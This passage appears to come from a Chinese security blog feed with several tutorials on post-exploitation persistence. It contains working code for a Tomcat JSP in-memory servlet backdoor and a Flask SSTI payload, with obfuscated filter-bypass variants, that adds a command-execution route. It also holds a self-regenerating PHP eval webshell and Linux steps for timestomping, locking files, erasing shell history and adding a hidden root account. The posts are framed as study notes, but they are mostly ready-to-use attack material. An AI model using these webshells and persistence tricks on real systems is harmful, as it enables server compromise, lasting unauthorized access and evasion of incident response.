class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.io.IOException&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> request <span class="built_in">this</span> file --&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span> request thisfile/../evilpage?cmd=calc --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request1</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response1</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line">        <span class="keyword">if</span> (request1.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(request1.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            response1.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">EvilServlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilServlet</span>();</span><br><span class="line">org.apache.catalina.<span class="type">Wrapper</span> <span class="variable">evilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">evilWrapper.setName(<span class="string">&quot;evilPage&quot;</span>);</span><br><span class="line">evilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">evilWrapper.setServlet(evilServlet);</span><br><span class="line">evilWrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line">standardContext.addChild(evilWrapper);</span><br><span class="line">standardContext.addServletMapping(<span class="string">&quot;/evilpage&quot;</span>, <span class="string">&quot;evilPage&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;动态注入servlet成功&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="哥斯拉内存马"><a href="#哥斯拉内存马" class="headerlink" title="哥斯拉内存马"></a>哥斯拉内存马</h4><p>哥斯拉先生成一个java的木马</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7b6cfa.png" alt="image-20240912174544931"></p><p>上传shell.jsp</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7ac9a6.png" alt="image-20240912174645903"></p><p><img src="https://bu.dusays.com/2024/10/11/670931a79ef13.png" alt="image-20240912174658715"></p><p>哥斯拉连接</p><p><img src="https://bu.dusays.com/2024/10/11/670931aa5e352.png" alt="image-20240912174832032"></p><p>进入</p><p><img src="https://bu.dusays.com/2024/10/11/670931ac65f5d.png" alt="image-20240912174915764"></p><p>上面有一个memoryshell 这就是我们的内存马</p><p><img src="https://bu.dusays.com/2024/10/11/670931a988b6e.png" alt="image-20240912175020922"></p><p>我们run一下这个内存马</p><p>他的内存马是在&#x2F;favicon.ico下的</p><p>新建监听器连接</p><p><img src="https://bu.dusays.com/2024/10/11/670931ac2959b.png" alt="image-20240912175356400"></p><p>成功</p><p>是在根目录下</p><h4 id="冰蝎内存马"><a href="#冰蝎内存马" class="headerlink" title="冰蝎内存马"></a>冰蝎内存马</h4><p>之前一直没用过</p><p>冰蝎的木马是存放在他的文件夹中的</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7cb268.png" alt="image-20240912180142537"></p><p>默认连接密码rebeyond</p><p>上传木马</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7e2ee1.png" alt="image-20240912180333678"></p><p>冰蝎连接</p><p><img src="https://bu.dusays.com/2024/10/11/670931a98cf29.png" alt="image-20240912180523044"></p><p>打开</p><p><img src="https://bu.dusays.com/2024/10/11/670931a8307d3.png" alt="image-20240912180603597"></p><p>呃 连接失败了</p><p>好像是这个靶场权限的问题</p><p>我们把这个木马放到根目录下来</p><p><img src="https://bu.dusays.com/2024/10/11/670931a877314.png" alt="image-20240912180813697"></p><p>根目录下连接成功</p><p><img src="https://bu.dusays.com/2024/10/11/670931ad0791b.png" alt="image-20240912180851939"></p><p>在外面可以打内存马</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7dc8a1.png" alt="image-20240912181014999"></p><p><img src="https://bu.dusays.com/2024/10/11/670931a909fdc.png" alt="image-20240912181611469"></p><p>失败</p><p>网上找了发现是工具本身的问题</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7dd81d.png" alt="image-20240912181741905"></p><p>不能用这个路径</p><p>这个路径</p><p><img src="https://bu.dusays.com/2024/10/11/670931a8b76f3.png" alt="image-20240912181759767"></p><p>添加时也不能用这个路径</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7c6bba.png" alt="image-20240912181825778"></p><p>要到网站根目录下的&#x2F;aaa去</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7c84a8.png" alt="image-20240912181953948"></p><p>攻击成功</p><p><img src="https://bu.dusays.com/2024/10/11/670931abc8fdb.png" alt="image-20240912182019105"></p><p>网站根目录下是没有&#x2F;aaa路径的</p><p><img src="https://bu.dusays.com/2024/10/11/670931a94601a.png" alt="image-20240912182059599"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 维权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python内存马</title>
      <link href="/2024/10/11/python%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/10/11/python%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="web权限维持"><a href="#web权限维持" class="headerlink" title="web权限维持"></a>web权限维持</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>webshell内存马是把木马和后门写在内存中 然后去执行 达到webshell</p><p>可以加强攻击的隐蔽性和排查难度</p><h3 id="python内存马"><a href="#python内存马" class="headerlink" title="python内存马"></a>python内存马</h3><h4 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h4><p>常用的<code>Python</code>框架有<code>Django</code>、<code>Flask</code>, 这两者都可能存在<code>SSTI</code>漏洞. <strong>Python 内存马利用Flask框架中SSTI注入来实现</strong>, <code>Flask</code>框架中在<code>web</code>应用模板渲染的过程中用到<code>render_template_string</code>进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入.</p><p>当网页请求进入<code>Flask</code>时, 会实例化一个<code>Request Context</code>. 在<code>Python</code>中分出了两种上下文: 请求上下文(request context)、应用上下文(session context). 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个<code>Stack</code>的栈结构, 也就是说它拥有一个栈所拥有的全部特性. <code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p><img src="https://bu.dusays.com/2024/10/11/670930de14e73.png" alt="image-20240912154818715"></p><p><img src="https://bu.dusays.com/2024/10/11/670930dd9512b.png" alt="image-20240912155218550"></p><h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>马：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/test?param=&#123;&#123;url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>原型：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>把马传上去</p><p><img src="https://bu.dusays.com/2024/10/11/670930ddc2fb1.png" alt="image-20240912155629587"></p><p>这样我们就可以执行命令了</p><p>在shell路由下传参cmd 可执行命令  但是在服务器中是没有shell路径的</p><p><img src="https://bu.dusays.com/2024/10/11/670930dd99296.png" alt="image-20240912155754641"></p><h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>对于<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>这一截<code>Payload</code>, <code>url_for</code>是<code>Flask</code>的一个内置函数, 通过<code>Flask</code>内置函数可以调用其<code>__globals__</code>属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的<code>modules</code>, 可以看到这里是支持<code>__builtins__</code>的.</p><p><img src="https://bu.dusays.com/2024/10/11/670930dd90cf8.png" alt="image-20240912160154203"></p><p>在<code>__builtins__</code>模块中, <code>Python</code>在启动时就直接为我们导入了很多内建函数. 准确的说, <code>Python</code>在启动时会首先加载内建名称空间, 内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象.  在<code>__builtins__</code>模块的内建函数中是存在<code>eval</code>、<code>exec</code>等命令执行函数的.</p><p>由于存在命令执行函数, 因此我们就可以直接调用命令执行函数来执行危险操作</p><p>就是SSTI</p><p>接着再来看看<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())</code>这一截<code>Payload</code>. 这部分是动态添加了一条路由, 而处理该路由的函数是个由<code>lambda</code>关键字定义的匿名函数.</p><p>在<code>Flask</code>中注册路由的时候是添加的<code>@app.route()</code>装饰器来实现的, 跟进查看其源码实现, 发现其调用了<code>add_url_rule</code>函数来添加路由.</p><p><img src="https://bu.dusays.com/2024/10/11/670930dd98511.png" alt="image-20240912160616520"></p><blockquote><p>跟进<code>add_url_rule</code>函数, 其参数说明如下:</p><ul><li>rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.</li><li>endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.</li><li>view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.</li><li>provide_automatic_options: 控制是否应自动添加选项方法.</li><li>options: 要转发到基础规则对象的选项.</li></ul></blockquote><p><code>lambda</code>即匿名函数, <code>Payload</code>中<code>add_url_rule</code>函数的第三个参数定义了一个<code>lambda</code>匿名函数, 其中通过<code>os</code>库的<code>popen</code>函数执行从<code>Web</code>请求中获取的<code>cmd</code>参数值并返回结果, 其中该参数值默认为<code>whoami</code>.</p><p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>. <code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>. <code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>.</p><p>所以</p><p><code>eval</code>函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>在实际应用中往往都存在过滤, 因此了解如何绕过还是必要的.</p><ul><li><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code>.</li><li>代码执行函数替换, 如<code>exec</code>等替换<code>eval</code>.</li><li>字符串可采用拼接方式, 如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>.</li><li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换.</li><li><code>[]</code>可用<code>.__getitem__()</code>或<code>.pop()</code>替换.</li><li>过滤<code>&#123;&#123;`或者`&#125;&#125;</code>, 可以使用<code>&#123;%`或者`%&#125;</code>绕过, <code>&#123;%%&#125;</code>中间可以执行<code>if</code>语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</li><li>过滤<code>_</code>可以用编码绕过, 如<code>__class__</code>替换成<code>\x5f\x5fclass\x5f\x5f</code>, 还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]</code>绕过.</li><li>过滤了<code>.</code>可以采用<code>attr()</code>或<code>[]</code>绕过.</li></ul><p>就是ssti的绕过</p><p>原型payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>变形payload1:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">request.application.__self__._get_data_for_json.__getattribute__(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).__getitem__(<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>).__getitem__(<span class="string">&#x27;ex&#x27;</span>+<span class="string">&#x27;ec&#x27;</span>)(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;, &#x27;calc&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ct&#x27;</span>+<span class="string">&#x27;x_stack&#x27;</span>:get_flashed_messages.__getattribute__(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;_request_&#x27;</span>+<span class="string">&#x27;ctx_stack&#x27;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages.__getattribute__(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;curre&#x27;</span>+<span class="string">&#x27;nt_app&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure><p>变形payload2:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;app.add_ur&quot;</span>+<span class="string">&quot;l_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, la&quot;</span>+<span class="string">&quot;mbda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(_request_c&quot;</span>+<span class="string">&quot;tx_stack.to&quot;</span>+<span class="string">&quot;p.re&quot;</span>+<span class="string">&quot;quest.args.get(&#x27;shell&#x27;)).re&quot;</span>+<span class="string">&quot;ad())&quot;</span>,&#123;<span class="string">&#x27;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> web </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 维权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php内存马</title>
      <link href="/2024/10/11/php%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/10/11/php%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="web权限维持"><a href="#web权限维持" class="headerlink" title="web权限维持"></a>web权限维持</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>webshell内存马是把木马和后门写在内存中 然后去执行 达到webshell</p><p>可以加强攻击的隐蔽性和排查难度</p><h3 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.HH.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[\&#x27;c\&#x27;]); ?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p><code>ignore_user_abort(true);</code></p><p>这条语句的作用是告诉PHP，即使客户端（如浏览器）中断了连接，脚本也应该继续执行。这通常用于需要长时间运行且不需要用户持续交互的脚本。</p></li><li><p><code>set_time_limit(0);</code></p><p>通过设置脚本执行时间为0，这告诉PHP取消脚本执行时间的限制。这意味着脚本可以无限期地运行，直到被外部干预（如服务器配置限制、系统资源耗尽等）停止。</p></li><li><p><code>@unlink(__FILE__);</code></p><p>这条语句尝试删除当前正在执行的PHP文件。<code>@</code>符号是PHP的错误控制运算符，它会抑制错误消息的显示。防文件落地被查杀</p></li><li><p>脚本进入一个无限循环，不断使用<code>file_put_contents</code>函数将一段包含<code>eval($_POST[&#39;c&#39;]);</code>的PHP代码写入（或覆盖）<code>.HH.php</code>文件。</p></li><li><p><code>usleep(5000);</code></p><p>在每次写入文件后，脚本会暂停5000微秒（即5毫秒）。这是为了避免因为连续写入操作过快而导致的资源耗尽或其他问题。</p></li></ol><p>将内存马写入网站根目录shell.php 访问执行</p><p><img src="https://bu.dusays.com/2024/10/11/67092fbed8601.png" alt="image-20240912152832339"></p><p>shell.php消失 .HH.php出现</p><p>且将浏览器关掉以后 删除.HH.php会不断重新生成.HH.php</p><p>删除办法</p><p>1.结束进程再删除</p><p>2.写脚本和它竞争，在每次创建的时候把它删除</p><p>3.强行kill后台进程 <code>ps aux|grep www-data|awk &#39;&#123;print 2&#125;&#39;| xargs kill -9</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092fbe94a05.png" alt="image-20240912153327416"></p><p>小p停掉Nginx后再删就行</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> web </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 维权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux权限维持</title>
      <link href="/2024/10/11/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2024/10/11/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="linux权限维持"><a href="#linux权限维持" class="headerlink" title="linux权限维持"></a>linux权限维持</h2><h3 id="木马修改时间"><a href="#木马修改时间" class="headerlink" title="木马修改时间"></a>木马修改时间</h3><p><code>touch -r 目标文件 木马文件</code></p><p>将木马的时间修改成与另一个文件的时间相同 这样可能让受害者排查木马时忽略木马 </p><p><img src="https://bu.dusays.com/2024/10/11/67092e657c1ef.png" alt="image-20240909110308456"></p><p><code>touch -r ex10 shell.php </code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e64a0970.png" alt="image-20240909110417746"></p><h3 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h3><p>为了防止用户误删除的操作</p><p><code>chattr +i</code>锁定</p><p><code>chattr -i</code> 解锁</p><p><code>lsattr shell.php</code>  看锁定状态</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5c12db7.png" alt="image-20240909110841089"></p><h3 id="历史记录隐藏"><a href="#历史记录隐藏" class="headerlink" title="历史记录隐藏"></a>历史记录隐藏</h3><p>我们再linnux中执行的所有命令都会被记录下来</p><p><code>history</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5cb6cd1.png" alt="image-20240909124838398"></p><p>所以我们需要清除我们的攻击记录</p><p>隐藏接下来的命令记录</p><p><code>空格 set +o history</code></p><p>恢复</p><p><code>空格 set -o history</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5c83b24.png" alt="image-20240909125129225"></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5ea5fbd.png" alt="image-20240909125147820"></p><p>但是</p><p><code>空格 set +o history</code></p><p>仍被记录</p><p>所以</p><p>history -d 行号</p><p><code>history -d 104</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5c53649.png" alt="image-20240909125707199"></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5e20c63.png" alt="image-20240909125812282"></p><p>已隐藏</p><h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>我们可以用touch创建隐藏文件</p><p><code>touch .文件名</code>   创建隐藏文件</p><p><code>ls -al  </code>       查看隐藏文件</p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>#添加账号test，设置uid为0，密码为123456</p><blockquote><p>useradd -p <code>openssl passwd -1 -salt &#39;salt&#39; 123456</code> test -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test1</p></blockquote><p>当然我们也可以手动写入密码文件</p><ol><li>首先，使用perl语言（Linux自带）生成带有盐值的密码：</li></ol><p>  <code>perl -le &#39;print crypt(&quot;123456&quot;,&quot;addedsalt&quot;)&#39;</code></p><p>  把生成的密码(这里是adrla7IBSfTZQ)写入</p><ol start="2"><li>添加test2账号，密码设置为123456</li></ol><p>  <code>echo &quot;test2:adrla7IBSfTZQ:0:0:root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</code></p><h3 id="SUID-shell"><a href="#SUID-shell" 